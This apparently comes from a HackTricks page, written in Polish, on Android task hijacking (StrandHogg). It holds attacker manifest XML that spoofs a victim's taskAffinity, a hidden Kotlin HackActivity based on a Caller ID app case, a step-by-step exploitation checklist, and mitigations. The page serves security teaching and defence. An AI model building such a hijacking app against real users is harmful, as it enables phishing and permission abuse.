# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Task, Back Stack and Foreground Activities

W Androidzie, **task** to zasadniczo zestaw aktywności, z którymi użytkownicy wchodzą w interakcję, aby wykonać określone zadanie, zorganizowane w **back stack**. Ten stos porządkuje aktywności na podstawie momentu ich otwarcia, z najnowszą aktywnością wyświetlaną na górze jako **foreground activity**. W każdej chwili tylko ta aktywność jest widoczna na ekranie, co czyni ją częścią **foreground task**.

Oto szybkie podsumowanie przejść między aktywnościami:

- **Activity 1** zaczyna jako jedyna aktywność w foreground.
- Uruchomienie **Activity 2** przesuwa **Activity 1** do back stack, przynosząc **Activity 2** na foreground.
- Rozpoczęcie **Activity 3** przesuwa **Activity 1** i **Activity 2** dalej w stosie, z **Activity 3** teraz na przodzie.
- Zamknięcie **Activity 3** przywraca **Activity 2** na foreground, pokazując uproszczony mechanizm nawigacji zadań w Androidzie.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Task affinity attacks

`taskAffinity` informuje Android, do którego tasku `Activity` *preferuje* należeć. Gdy dwie aktywności dzielą tę samą afinitet, **Android ma prawo połączyć je w tym samym back-stack, nawet jeśli pochodzą z różnych APK**.

Jeśli atakujący może umieścić złośliwą aktywność na **root** tego stosu, za każdym razem, gdy ofiara otworzy legalną aplikację, złośliwy interfejs użytkownika będzie pierwszą rzeczą, którą zobaczy użytkownik – idealne do phishingu lub nadużywania uprawnień.

Powierzchnia ataku jest szersza, niż wielu deweloperów myśli, ponieważ **każda aktywność automatycznie dziedziczy afinitet równy nazwie pakietu aplikacji** (chyba że deweloper ustawi `android:taskAffinity=""`). Dlatego *nic nie robiąc* aplikacja już jest narażona na przejęcie zadań w wersjach Androida przed 11.

### Klasyczny scenariusz "singleTask / StrandHogg"

1. Atakujący deklaruje aktywność z:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. Złośliwa aplikacja jest uruchamiana raz, aby task (z fałszywą afinitetą) istniał w ostatnich zadaniach.
3. Gdy użytkownik później otworzy prawdziwą aplikację, Android stwierdza, że już istnieje task, którego **root affinity pasuje do pakietu** i po prostu przynosi ten task na foreground.
4. Interfejs użytkownika atakującego jest wyświetlany jako pierwszy.

### Wariant Default–Affinity (bez `singleTask`) – Studium przypadku Caller ID

Wrażliwość zgłoszona w aplikacji **Caller ID (caller.id.phone.number.block)** pokazuje, że atak *również* działa przeciwko domyślnemu trybowi uruchamiania `standard`:

1. Aplikacja atakującego tworzy fałszywą aktywność root i natychmiast się ukrywa:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // utrzymuje task w ostatnich, ale poza zasięgiem wzroku
}
}
```
2. Manifest musi tylko skopiować pakiet ofiary do `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Gdy użytkownik zainstaluje i otworzy złośliwą aplikację **raz**, istnieje task, którego afinitet równa się pakietowi ofiary (ale siedzi w tle).
4. Gdy uruchamiana jest prawdziwa aplikacja Caller ID, Android ponownie wykorzystuje ten task i przynosi `HackActivity` na foreground → okno phishingowe/nadużycie uprawnień.

> UWAGA: Począwszy od **Android 11 (API 30)** system *nie* umieszcza dwóch pakietów, które nie są częścią tego samego UID, w tym samym tasku domyślnie, co łagodzi ten konkretny wariant. Starsze wersje pozostają narażone.

---

## Detection & Exploitation checklist

1. Pobierz `AndroidManifest.xml` z docelowego APK i sprawdź, czy każda `<activity>` (lub globalny element `<application>`) zawiera `android:taskAffinity=""` (pusty) **lub** dostosowaną wartość.
2. Jeśli nie, stwórz złośliwą aplikację:
- `android:taskAffinity` = nazwa pakietu ofiary.
- Zapewnij intencję `MAIN/LAUNCHER`, aby użytkownik mógł ją otworzyć raz.
- Opcjonalnie wywołaj `moveTaskToBack(true)`, aby natychmiast się ukryć.
3. Pozwól ofierze otworzyć swoją legalną aplikację → przejęcie.

## Mitigation

Deweloperzy powinni:

* Wyraźnie ustawić `android:taskAffinity=""` na poziomie `<application>` (zalecane) **lub** nadać każdej aktywności unikalną, prywatną afinitet.
* Dla wysoce wrażliwych ekranów, połączyć powyższe z `android:launchMode="singleInstance"` lub nowoczesnymi [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) zabezpieczeniami.
* Zaktualizować `targetSdkVersion` aplikacji i egzekwować **zmiany w zachowaniu Androida 11**, gdzie taski nie są domyślnie dzielone między pakietami.

---

## References

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)

{{#include ../../banners/hacktricks-training.md}}
